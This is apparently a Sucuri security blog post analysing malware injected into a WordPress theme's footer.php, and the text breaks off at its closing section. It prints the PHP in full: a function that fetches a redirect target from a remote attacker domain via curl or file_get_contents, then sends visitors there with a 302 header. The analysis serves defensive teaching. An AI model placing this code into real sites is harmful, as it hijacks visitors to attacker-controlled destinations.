---
title: Attackers Inject Code into WordPress Theme to Redirect Visitors
url: https://blog.sucuri.net/2025/07/attackers-inject-code-into-wordpress-theme-to-redirect-visitors.html
source: Sucuri Blog
date: 2025-07-10
fetch_date: 2025-10-06T23:25:04.438723
---

# Attackers Inject Code into WordPress Theme to Redirect Visitors

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Attackers Inject Code into WordPress Theme to Redirect Visitors

[![](https://secure.gravatar.com/avatar/067bd4ee574f53bb79d411d83b5cc84ea794c798f945cb84a001cbe05fee65df?s=60&d=mm&r=g)](https://blog.sucuri.net/author/matt-morrow)

[Matt Morrow](https://blog.sucuri.net/author/matt-morrow)

* July 9, 2025

![Attackers Inject Code into WordPress Theme to Redirect Visitors](https://blog.sucuri.net/wp-content/uploads/2025/07/Attackers-Inject-Code-into-WordPress-Theme-to-Redirect-Visitors-820x385.png)

In a [recent article](https://blog.sucuri.net/2025/05/what-motivates-website-malware-attacks.html) we discussed some of the reasons sites are frequently attacked. That article covered browser redirects, and we’ll explore an example of such a case here.

Website themes are a common attack vector for many reasons. The theme is guaranteed to load on every page, that is the core design of any site, and themes can easily be customized in the site’s admin panel. However, sometimes an attacker will inject code directly into the theme’s files since those are not readily visible by a website administrator and any changes may go unnoticed unless the admin is specifically looking through the site’s directory structure and manually inspecting code.

Let’s take a look.

![code found in footer.php](https://blog.sucuri.net/wp-content/uploads/2025/07/code-found-in-footer-php.png)

This block of code was injected directly into a theme’s `footer.php` file just above the file’s normal functionality. The `footer.php` is responsible for displaying closing content at the bottom of a site’s pages and often includes functions to retrieve content from the database like company contact information, copyright banners or company logos. This also gives the attackers a location to inject hidden malware or redirects.

Normally I would start at the beginning of the code but in this case, the code begins to execute after the initial block is defined, which is the bulk of the functionality.. Skipping down we see the script calls the `r2048()` function with a very specific URL.

# Breaking down the malware

```
$tgurl = @r2048("http://youtubesave.org/rl/g.php");
```

After calling the **r2048** function, the script confirms that a value was returned,  clears any current output buffering to prevent any corruption in the header data and sends the returned URL to the browser’s headers, initiating the redirect.

```
if($tgurl){
    while (@ob_get_level()) {
        @ob_end_clean();
    }
    header("Location: " . $tgurl, true, 302);
    exit;
}
```

Let’s take a look at the **r2048**  function, where the real work is performed.

```
function r2048($u){
    $t = "";
    $to = 20;
    if( @function_exists('curl_version') || in_array('curl', get_loaded_extensions()) ){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $u);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, $to);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $t = curl_exec($ch);
        curl_close($ch);
    } else {
        $x = stream_context_create(array("http" => array('timeout' => $to), "https" => array('timeout' => $to)));
        $t = file_get_contents($u, false, $x);
    }
    return $t;
}
```

Simply put, this function checks the server for the existence of curl support and, if that isn’t present, reverts to the **file\_get\_contents** internal PHP function.

After calling one of the options, **curl** or **file\_get\_contents**, using the URL passed earlier from the **$tgurl** variable, the function populates the **$t** variable with the output of the remote URL and returns that to the original function where the **header(“Location: “** function triggers the redirect.

# Examining the remote content

Since we have a hard-coded URL, we can inspect that to see what’s going on. Plugging that into a browser, we see the URL the victim site will be redirected to.

![redirect URL](https://blog.sucuri.net/wp-content/uploads/2025/07/redirect-url-600x205.png)

This is pretty straightforward, by returning the target URL from a remote server the attackers could control where the victim will be redirected based on factors like the browser or mobile device in use. Unfortunately we are not able to see the code on that remote server, but there doesn’t seem to be anything more going on since the URL displayed there is sent to the headers of the victim’s browser.

# Wrapping Up

Website...